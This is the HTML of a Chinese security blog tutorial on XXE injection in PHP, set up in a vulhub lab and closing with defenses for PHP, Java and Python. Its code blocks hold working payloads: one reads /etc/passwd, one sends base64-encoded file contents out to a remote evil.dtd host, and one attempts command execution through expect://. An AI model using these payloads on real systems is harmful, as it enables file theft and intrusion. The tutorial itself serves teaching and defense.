@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          简析XXE - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/07/简析XXE/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                          <a class="tag" href="/tags/#XXE" title="XXE">XXE</a>
+                        
+                    </div>
+                    <h1>简析XXE</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-07-19
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p>更详细的XML介绍 <a href="https://blog.csdn.net/com_ma/article/details/73277535" target="_blank" rel="noopener">https://blog.csdn.net/com_ma/article/details/73277535</a></p>
+<h2 id="个人理解"><a href="#个人理解" class="headerlink" title="个人理解"></a>个人理解</h2><p>XML是一种较为通用的数据交互格式，在json出现之前较为流行，近几年逐渐被json所替代。<br>XML的格式类似于html，是html的超集。用于标记数据，大多数编程语言也内置了对XML的处理  </p>
+<h2 id="XML格式"><a href="#XML格式" class="headerlink" title="XML格式"></a>XML格式</h2><p>主要由<strong>XML声明</strong>、<strong>文档类型定义(DTD)</strong>、<strong>文档元素</strong>构成<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span>  <span class="comment">&lt;!--  XML声明 --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[			&lt;!-- 文档类型定义 --&gt;</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span>		(<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span>		(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span>		(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span>	(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span>		(<span class="meta-keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> 					<span class="comment">&lt;!--  文档元素 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>beijing<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>zhejiang<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>race<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>testbody<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
+</blockquote>
+<h2 id="DTD实体声明"><a href="#DTD实体声明" class="headerlink" title="DTD实体声明"></a>DTD实体声明</h2><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-string">"实体的值"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>声明过的值可以在怨怒是文档中用<code>&amp;name;</code>的格式获取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span>  <span class="meta-string">"sec test"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>此处相当于在DTD中定义了xxe的值为 <code>sec test</code>, 然后再文档元素中通过<code>&amp;xxe;</code>来获取变量的值<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/简析XXE/1.png" alt></p>
+<h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><p>XXE也叫做XML外部实体注入，正是因为它利用了外部实体引用<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"URI"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>外部实体引用支持通过协议，来动态的获取值<br>例如通过<code>file://</code>协议来读取文件内容<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/简析XXE/2.png" alt><br>也正是因为这样，XXE的攻击从而就产生了<br>不同的语言支持的协议不同，这里盗一张图<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/简析XXE/3.jpg" alt></p>
+<h3 id="参数实体声明"><a href="#参数实体声明" class="headerlink" title="参数实体声明"></a>参数实体声明</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-string">"实体的值"</span>&gt;</span></span><br><span class="line">or</span><br><span class="line"><span class="meta">&lt;!ENTITY % 实体名称 <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"URI"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>解析实体或者uri，进行xml解析，进而获得其中的变量<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY  % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xss.kingkk.com/xxe"</span> &gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>远程服务器的xxe中的内容<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY <span class="meta-keyword">evil</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>获取其中定义的evil值，并在被攻击机中使用<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/简析XXE/3.png" alt></p>
+<p><code>file:///etc/passwd</code>会在最后的被攻击机中解析，所以获得的是被攻击机的passwd，远程服务器相当于只是提供一个文本  </p>
+<p>这样也相当于<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY  % <span class="meta-keyword">xxe</span> <span class="meta-string">"&lt;!ENTITY evil SYSTEM 'file:///etc/passwd'&gt;"</span> &gt;</span></span></span><br><span class="line"><span class="meta">	%xxe;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;evil;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/简析XXE/4.png" alt></p>
+<h3 id="公共实体声明"><a href="#公共实体声明" class="headerlink" title="公共实体声明"></a>公共实体声明</h3><p>不是很常用，了解一下即可<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY 实体名称 <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"public_ID"</span> <span class="meta-string">"URI"</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>还是用p师傅的vulhub，不然自己编译低版本xml可能要死过去 <a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/php_xxe</a></p>
+<ul>
+<li>php 7.0.30</li>
+<li>apache2</li>
+<li>libxml 2.8.0<br>XXE漏洞于php版本无关，主要是libxml的拓展。2.9以后默认不使用外部实体，导致php的xxe几乎消亡  </li>
+</ul>
+<p>其中主要由三个文件，也分别对应着三个处理xml的函数，都可以触发XXE   </p>
+<p>SimpleXMLElemnet.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure></p>
+<p>dom.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure></p>
+<p>simplexml_load_string.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure></p>
+<h1 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h1><h2 id="有回显型"><a href="#有回显型" class="headerlink" title="有回显型"></a>有回显型</h2><p>之前讲外部实体时就已经演示过了，利用外部实体，获取文件内容<br>然后利用输出就能够任意文件读取<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">	<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>echo $xml-&gt;name;</code>就会将解析到的name值，也就是<code>/etc/passwd</code>的内容输出来<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/简析XXE/2.png" alt> </p>
+<h2 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h2><p>当利用不将对应的值输出来时，该如何进行攻击呢<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// echo $xml-&gt;name;</span></span><br></pre></td></tr></table></figure></p>
+<p>这时可以借助http协议，将获取到文件内容发送到远程服务器上<br>从而获取文件内容</p>
+<p>事先在远程服务上写入 evil.dtd  （ % 需要实体编码成<code>&amp;#x25;</code><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY &amp;#x25; <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">'http://xss.kingkk.com/?%file;'</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>然后利用如下payload<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=./dom.php"</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY  % <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://xss.kingkk.com/evil.dtd"</span> &gt;</span></span></span><br><span class="line"><span class="meta">    %xxe;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>先利用php为协议将文件用base64读取出来，然后以参数的形式发送到远程服务器<br>即可在服务器的log中看到base64加密后的内容<br><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/简析XXE/5.png" alt> </p>
+<h2 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h2><p>由于有http协议，就能伪造请求，和ssrf同理，ssrf能做的事，xxe也都可以<br>比如什么内网探测，sql注入等。这里就不过多介绍</p>
+<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>需要一个额外的expect拓展，需要额外安装<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"except://ls"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"> <span class="symbol">&amp;f;</span></span><br></pre></td></tr></table></figure></p>
+<p>没有实际测试过</p>
+<h1 id="防御XXE"><a href="#防御XXE" class="headerlink" title="防御XXE"></a>防御XXE</h1><p>最简单也最彻底的防御就是禁用外部实体<br>php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure></p>
+<p>java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure></p>
+<p>python<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></p>
+<p>过滤关键字的方法感觉有点傻，吃力不讨好</p>
+<h1 id="Reference-Link"><a href="#Reference-Link" class="headerlink" title="Reference Link"></a>Reference Link</h1><p><a href="https://github.com/vulhub/vulhub/tree/master/php/php_xxe" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/php/php_xxe</a><br><a href="https://blog.csdn.net/com_ma/article/details/73277535" target="_blank" rel="noopener">https://blog.csdn.net/com_ma/article/details/73277535</a><br><a href="http://www.freebuf.com/column/156863.html" target="_blank" rel="noopener">http://www.freebuf.com/column/156863.html</a><br><a href="https://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">https://security.tencent.com/index.php/blog/msg/69</a><br><a href="https://www.jianshu.com/p/7325b2ef8fc9" target="_blank" rel="noopener">https://www.jianshu.com/p/7325b2ef8fc9</a></p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2018/07/php反序列化漏洞/" data-toggle="tooltip" data-placement="top" title="php反序列化漏洞">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2018/07/phpinfo-with-LFI/" data-toggle="tooltip" data-placement="top" title="phpinfo with LFI">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#php" title="php">php</a>
+                        
+                          <a class="tag" href="/tags/#XXE" title="XXE">XXE</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
